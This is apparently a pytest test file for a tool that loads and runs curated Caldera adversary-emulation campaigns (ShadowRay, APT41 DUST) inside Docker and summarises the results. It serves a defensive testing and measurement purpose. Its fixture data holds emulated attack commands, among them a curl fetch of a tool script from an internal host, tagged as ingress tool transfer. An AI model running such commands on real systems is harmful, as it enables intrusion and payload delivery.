from __future__ import annotations

import json
from pathlib import Path

from sticks_docker.measurement.scripts import run_curated_caldera_campaigns as module


def test_list_curated_artifacts_covers_both_kinds() -> None:
    artifacts = module.list_curated_artifacts()
    kinds = {artifact.kind for artifact in artifacts}

    assert "ability" in kinds
    assert "adversary" in kinds
    assert any(artifact.name == "shadowray_dag-adversary.json" for artifact in artifacts)


def test_resolve_curated_api_dir_prefers_runtime_overlay(tmp_path: Path) -> None:
    original_runtime_dir = module.DEFAULT_RUNTIME_API_DIR
    try:
        module.DEFAULT_RUNTIME_API_DIR = tmp_path / "runtime-api"
        module.DEFAULT_RUNTIME_API_DIR.mkdir()
        assert module.resolve_curated_api_dir() == module.DEFAULT_RUNTIME_API_DIR
        explicit_dir = tmp_path / "explicit"
        assert module.resolve_curated_api_dir(explicit_dir) == explicit_dir
    finally:
        module.DEFAULT_RUNTIME_API_DIR = original_runtime_dir


def test_artifact_campaign_key_handles_curated_suffixes() -> None:
    assert module.artifact_campaign_key(
        module.CuratedArtifact(
            path=Path("/tmp/shadowray_dag-ability.json"),
            kind="ability",
            name="shadowray_dag-ability.json",
        )
    ) == "shadowray"
    assert module.artifact_campaign_key(
        module.CuratedArtifact(
            path=Path("/tmp/shadowray_dag-adversary.json"),
            kind="adversary",
            name="shadowray_dag-adversary.json",
        )
    ) == "shadowray"


def test_filter_artifacts_by_adversary_names_keeps_matching_pairs(tmp_path: Path) -> None:
    apt41_ability = tmp_path / "apt41_dust_dag-ability.json"
    apt41_ability.write_text(json.dumps({"ability_id": "ability-apt41"}), encoding="utf-8")
    apt41_adversary = tmp_path / "apt41_dust_dag-adversary.json"
    apt41_adversary.write_text(json.dumps({"name": "APT41 DUST"}), encoding="utf-8")
    shadowray_ability = tmp_path / "shadowray_dag-ability.json"
    shadowray_ability.write_text(
        json.dumps({"ability_id": "ability-shadowray"}),
        encoding="utf-8",
    )
    shadowray_adversary = tmp_path / "shadowray_dag-adversary.json"
    shadowray_adversary.write_text(json.dumps({"name": "ShadowRay"}), encoding="utf-8")

    artifacts = [
        module.CuratedArtifact(
            path=apt41_ability,
            kind="ability",
            name=apt41_ability.name,
        ),
        module.CuratedArtifact(
            path=apt41_adversary,
            kind="adversary",
            name=apt41_adversary.name,
        ),
        module.CuratedArtifact(
            path=shadowray_ability,
            kind="ability",
            name=shadowray_ability.name,
        ),
        module.CuratedArtifact(
            path=shadowray_adversary,
            kind="adversary",
            name=shadowray_adversary.name,
        ),
    ]

    filtered = module.filter_artifacts_by_adversary_names(artifacts, ["ShadowRay"])

    assert [artifact.name for artifact in filtered] == [
        "shadowray_dag-ability.json",
        "shadowray_dag-adversary.json",
    ]


def test_filter_artifacts_by_adversary_names_rejects_unknown_name(tmp_path: Path) -> None:
    shadowray_adversary = tmp_path / "shadowray_dag-adversary.json"
    shadowray_adversary.write_text(json.dumps({"name": "ShadowRay"}), encoding="utf-8")
    artifacts = [
        module.CuratedArtifact(
            path=shadowray_adversary,
            kind="adversary",
            name=shadowray_adversary.name,
        )
    ]

    try:
        module.filter_artifacts_by_adversary_names(artifacts, ["APT41 DUST"])
    except ValueError as error:
        assert "Unknown curated adversary name(s): APT41 DUST" in str(error)
        assert "Available names: ShadowRay" in str(error)
    else:
        raise AssertionError("Expected ValueError for unknown curated adversary name.")


def test_summarize_operations_counts_step_statuses() -> None:
    operations = [
        {
            "id": "operation-1",
            "name": "OP001",
            "state": "finished",
            "group": "red",
            "planner": {"name": "atomic"},
            "adversary": {"adversary_id": "A1"},
            "steps": [
                {"status": "success"},
                {"status": "success"},
                {"status": "failed"},
                {"pid": 10},
                {},
            ],
            "chain": [
                {
                    "status": 0,
                    "output": "True",
                    "ability": {"technique_id": "T1005", "name": "Data from Local System"},
                    "command": "cat /tmp/data.txt",
                },
                {
                    "status": -3,
                    "output": "False",
                    "ability": {"technique_id": "T1105", "name": "Ingress Tool Transfer"},
                    "command": "curl http://172.21.0.20/tool.sh",
                },
            ],
        }
    ]

    summary = module.summarize_operations(operations)

    assert summary == [
        {
            "id": "operation-1",
            "name": "OP001",
            "state": "finished",
            "planner": {"name": "atomic"},
            "adversary": {"adversary_id": "A1"},
            "host_group": "red",
            "step_count": 5,
            "step_status_counts": {
                "failed": 1,
                "started": 1,
                "success": 2,
                "unknown": 1,
            },
            "chain_count": 2,
            "chain_status_counts": {"-3": 1, "0": 1},
            "last_link": {
                "status": -3,
                "output": "False",
                "technique_id": "T1105",
                "name": "Ingress Tool Transfer",
                "command": "curl http://172.21.0.20/tool.sh",
            },
            "nonzero_links": [
                {
                    "index": 2,
                    "status": -3,
                    "output": "False",
                    "technique_id": "T1105",
                    "name": "Ingress Tool Transfer",
                    "command": "curl http://172.21.0.20/tool.sh",
                }
            ],
        }
    ]


def test_render_markdown_summary_mentions_operations() -> None:
    payload = {
        "generated_at_utc": "2026-03-20T00:00:00+00:00",
        "caldera_url": "http://127.0.0.1:8888",
        "poll_timeout_reached": False,
        "quiescent_plateau_reached": True,
        "effective_quiescent_seconds": 120,
        "counts": {
            "curated_abilities": 8,
            "curated_adversaries": 8,
            "red_agents": 1,
            "operations": 2,
        },
        "operations": [
            {
                "name": "OP001",
                "state": "finished",
                "step_count": 3,
                "step_status_counts": {"success": 3},
                "chain_count": 3,
                "chain_status_counts": {"0": 3},
                "last_link": {
                    "status": 0,
                    "output": "True",
                    "technique_id": "T1005",
                    "name": "Data from Local System",
                    "command": "cat /tmp/data.txt",
                },
            },
            {
                "name": "OP002",
                "state": "running",
                "step_count": 2,
                "step_status_counts": {"running": 2},
                "chain_count": 2,
                "chain_status_counts": {"0": 1, "-3": 1},
                "last_link": {
                    "status": -3,
                    "output": "False",
                    "technique_id": "T1105",
                    "name": "Ingress Tool Transfer",
                    "command": "curl http://172.21.0.20/tool.sh",
                },
            },
        ],
    }

    markdown = module.render_markdown_summary(payload)

    assert "# Docker Caldera Execution Audit" in markdown
    assert "### OP001" in markdown
    assert "### OP002" in markdown
    assert "`False`" in markdown


def test_write_results_can_skip_latest_update(tmp_path: Path) -> None:
    original_results_dir = module.RESULTS_DIR
    original_latest_json = module.LATEST_JSON
    original_latest_md = module.LATEST_MD
    try:
        module.RESULTS_DIR = tmp_path
        module.LATEST_JSON = tmp_path / "docker_caldera_execution_latest.json"
        module.LATEST_MD = tmp_path / "DOCKER_CALDERA_EXECUTION_LATEST.md"
        module.LATEST_JSON.write_text("previous-json\n", encoding="utf-8")
        module.LATEST_MD.write_text("previous-md\n", encoding="utf-8")

        json_path, md_path = module.write_results(
            {
                "generated_at_utc": "2026-03-21T02:54:09+00:00",
                "caldera_url": "http://127.0.0.1:8888",
                "counts": {
                    "curated_abilities": 2,
                    "curated_adversaries": 1,
                    "red_agents": 1,
                    "operations": 1,
                },
                "poll_timeout_reached": False,
                "quiescent_plateau_reached": True,
                "effective_quiescent_seconds": 120,
                "operations": [],
            },
            update_latest=False,
        )

        assert json_path.exists()
        assert md_path.exists()
        assert module.LATEST_JSON.read_text(encoding="utf-8") == "previous-json\n"
        assert module.LATEST_MD.read_text(encoding="utf-8") == "previous-md\n"
    finally:
        module.RESULTS_DIR = original_results_dir
        module.LATEST_JSON = original_latest_json
        module.LATEST_MD = original_latest_md


def test_operations_are_quiescent_requires_stable_chain_and_progress() -> None:
    operations = [
        {
            "id": "operation-1",
            "state": "running",
            "chain": [{"status": 0}, {"status": -3}],
        }
    ]

    previous_fingerprint = tuple(module.operation_fingerprint(operation) for operation in operations)

    assert module.operations_are_quiescent(operations, previous_fingerprint) is True
    assert module.operations_are_quiescent([], previous_fingerprint) is False
    assert module.operations_are_quiescent(
        [{"id": "operation-1", "state": "running", "chain": []}],
        previous_fingerprint,
    ) is False


def test_operations_fingerprint_is_order_insensitive() -> None:
    operations = [
        {"id": "operation-2", "state": "running", "chain": [{"status": 0}]},
        {"id": "operation-1", "state": "running", "chain": [{"status": 0}, {"status": -3}]},
    ]

    forward = module.operations_fingerprint(operations)
    reversed_order = module.operations_fingerprint(list(reversed(operations)))

    assert forward == reversed_order
    assert module.operations_are_quiescent(list(reversed(operations)), forward) is True


def test_create_operation_uses_caldera_rest_api(monkeypatch) -> None:
    calls = []

    class FakeResponse:
        text = '{"id":"operation-1"}'

        def raise_for_status(self) -> None:
            return None

    def fake_put(url, headers, json, timeout):
        calls.append((url, headers, json, timeout))
        return FakeResponse()

    monkeypatch.setattr(module.requests, "put", fake_put)

    result = module.create_operation(
        base_url="http://127.0.0.1:8888/",
        api_key="ADMIN123",
        operation_name="OP001",
        group_name="red",
        adversary_id="adv-1",
    )

    assert result.stdout == '{"id":"operation-1"}'
    assert calls == [
        (
            "http://127.0.0.1:8888/api/rest",
            {"KEY": "ADMIN123", "Content-Type": "application/json"},
            {
                "index": "operations",
                "name": "OP001",
                "group": "red",
                "planner": "atomic",
                "jitter": "2/8",
                "adversary_id": "adv-1",
            },
            30,
        )
    ]


def test_build_container_port_check_command_uses_docker_exec() -> None:
    command = module.build_container_port_check_command("nginx", (22, 8080, 8116))

    assert command[:4] == ["docker", "exec", "nginx", "sh"]
    assert ":22 " in command[-1]
    assert ":8080 " in command[-1]
    assert ":8116 " in command[-1]


def test_wait_for_shared_substrate_retries_until_all_ports_ready(monkeypatch) -> None:
    attempts = {"count": 0}

    def fake_container_ports_ready(container_name: str, ports: tuple[int, ...]) -> bool:
        attempts["count"] += 1
        if attempts["count"] < 2:
            return False
        return True

    monkeypatch.setattr(module, "container_ports_ready", fake_container_ports_ready)
    monkeypatch.setattr(module.time, "sleep", lambda _: None)

    module.wait_for_shared_substrate(timeout_seconds=1, poll_interval_seconds=0)

    assert attempts["count"] >= 2


def test_load_artifact_payloads_accepts_single_object(tmp_path: Path) -> None:
    payload_path = tmp_path / "single.json"
    payload_path.write_text(json.dumps({"ability_id": "one"}), encoding="utf-8")

    assert module.load_artifact_payloads(payload_path) == [{"ability_id": "one"}]


def test_collect_curated_object_ids_groups_abilities_and_adversaries(tmp_path: Path) -> None:
    ability_path = tmp_path / "ability.json"
    ability_path.write_text(json.dumps({"ability_id": "ability-1"}), encoding="utf-8")
    adversary_path = tmp_path / "adversary.json"
    adversary_path.write_text(json.dumps({"name": "Adversary One"}), encoding="utf-8")

    artifacts = [
        module.CuratedArtifact(path=ability_path, kind="ability", name="ability.json"),
        module.CuratedArtifact(path=adversary_path, kind="adversary", name="adversary.json"),
    ]

    assert module.collect_curated_object_ids(artifacts) == {
        "abilities": {"ability-1"},
        "adversaries": {"Adversary One"},
    }


def test_empty_caldera_with_artifacts_uses_matching_cleanup(monkeypatch, tmp_path: Path) -> None:
    ability_path = tmp_path / "ability.json"
    ability_path.write_text(json.dumps({"ability_id": "ability-1"}), encoding="utf-8")
    adversary_path = tmp_path / "adversary.json"
    adversary_path.write_text(json.dumps({"name": "Adversary One"}), encoding="utf-8")
    artifacts = [
        module.CuratedArtifact(path=ability_path, kind="ability", name="ability.json"),
        module.CuratedArtifact(path=adversary_path, kind="adversary", name="adversary.json"),
    ]
    calls: list[tuple[str, str, object]] = []

    def fake_delete_all_objects(
        base_url: str,
        api_key: str,
        endpoint: str,
        id_field: str,
    ) -> dict[str, int]:
        calls.append((endpoint, id_field, None))
        return {"deleted": 0, "remaining": 0}

    def fake_delete_matching_objects(
        base_url: str,
        api_key: str,
        endpoint: str,
        id_field: str,
        identifiers: set[str],
    ) -> dict[str, int]:
        calls.append((endpoint, id_field, identifiers))
        return {"deleted": len(identifiers), "remaining": 0}

    def fake_delete_matching_adversaries_by_name(
        base_url: str,
        api_key: str,
        names: set[str],
    ) -> dict[str, int]:
        calls.append(("/api/v2/adversaries", "name", names))
        return {"deleted": len(names), "remaining": 0}

    monkeypatch.setattr(module, "delete_all_objects", fake_delete_all_objects)
    monkeypatch.setattr(module, "delete_matching_objects", fake_delete_matching_objects)
    monkeypatch.setattr(
        module,
        "delete_matching_adversaries_by_name",
        fake_delete_matching_adversaries_by_name,
    )

    result = module.empty_caldera("http://127.0.0.1:8888", "ADMIN123", artifacts)

    assert result["operations"] == {"deleted": 0, "remaining": 0}
    assert result["adversaries"] == {"deleted": 1, "remaining": 0}
    assert result["abilities"] == {"deleted": 1, "remaining": 0}
    assert calls == [
        ("/api/v2/operations", "id", None),
        ("/api/v2/adversaries", "name", {"Adversary One"}),
        ("/api/v2/abilities", "ability_id", {"ability-1"}),
    ]


def test_extract_loaded_adversaries_preserves_artifact_order(tmp_path: Path) -> None:
    ability_path = tmp_path / "ability.json"
    ability_path.write_text(json.dumps({"ability_id": "ability-1"}), encoding="utf-8")
    adversary_a = tmp_path / "a-adversary.json"
    adversary_a.write_text(json.dumps({"name": "A"}), encoding="utf-8")
    adversary_b = tmp_path / "b-adversary.json"
    adversary_b.write_text(json.dumps({"name": "B"}), encoding="utf-8")

    artifacts = [
        module.CuratedArtifact(path=ability_path, kind="ability", name="ability.json"),
        module.CuratedArtifact(path=adversary_b, kind="adversary", name="b-adversary.json"),
        module.CuratedArtifact(path=adversary_a, kind="adversary", name="a-adversary.json"),
    ]
    load_log = [
        {
            "kind": "adversary",
            "path": str(adversary_b),
            "stdout": json.dumps({"name": "B", "adversary_id": "adv-b"}),
            "stderr": "",
        },
        {
            "kind": "adversary",
            "path": str(adversary_a),
            "stdout": json.dumps({"name": "A", "adversary_id": "adv-a"}),
            "stderr": "",
        },
    ]

    assert module.extract_loaded_adversaries(artifacts, load_log) == [
        {"name": "B", "adversary_id": "adv-b"},
        {"name": "A", "adversary_id": "adv-a"},
    ]


def test_create_curated_operations_uses_api_creation(monkeypatch) -> None:
    calls: list[tuple[str, str, str, str, str]] = []

    def fake_create_operation(
        base_url: str,
        api_key: str,
        operation_name: str,
        group_name: str,
        adversary_id: str,
    ):
        calls.append((base_url, api_key, operation_name, group_name, adversary_id))
        return module.OperationCreationResult(stdout="ok")

    monkeypatch.setattr(module, "create_operation", fake_create_operation)

    log = module.create_curated_operations(
        [
            {"name": "APT41 DUST", "adversary_id": "adv-1"},
            {"name": "ShadowRay", "adversary_id": "adv-2"},
        ],
        "red",
        "http://127.0.0.1:8888",
        "ADMIN123",
    )

    assert calls == [
        ("http://127.0.0.1:8888", "ADMIN123", "OP001", "red", "adv-1"),
        ("http://127.0.0.1:8888", "ADMIN123", "OP002", "red", "adv-2"),
    ]
    assert log[0]["adversary_name"] == "APT41 DUST"
    assert log[1]["operation_name"] == "OP002"


def test_import_curated_object_retries_until_success(monkeypatch) -> None:
    attempts = {"count": 0}

    class FakeResponse:
        def __init__(self, status_code: int, text: str):
            self.status_code = status_code
            self.text = text

    def fake_post(*args, **kwargs):
        attempts["count"] += 1
        if attempts["count"] < 2:
            raise module.requests.RequestException("caldera still warming up")
        return FakeResponse(200, "ok")

    monkeypatch.setattr(module.requests, "post", fake_post)
    monkeypatch.setattr(module.time, "sleep", lambda _: None)

    response = module.import_curated_object(
        "http://127.0.0.1:8888",
        "ADMIN123",
        "/api/v2/abilities",
        {"ability_id": "test"},
        retries=3,
        retry_delay_seconds=0,
    )

    assert response.status_code == 200
    assert attempts["count"] == 2


def test_parse_args_accepts_repeated_adversary_names(monkeypatch) -> None:
    monkeypatch.setattr(
        "sys.argv",
        [
            "run_curated_caldera_campaigns.py",
            "--adversary-name",
            "APT41 DUST",
            "--adversary-name",
            "ShadowRay",
        ],
    )

    arguments = module.parse_args()

    assert arguments.adversary_name == ["APT41 DUST", "ShadowRay"]
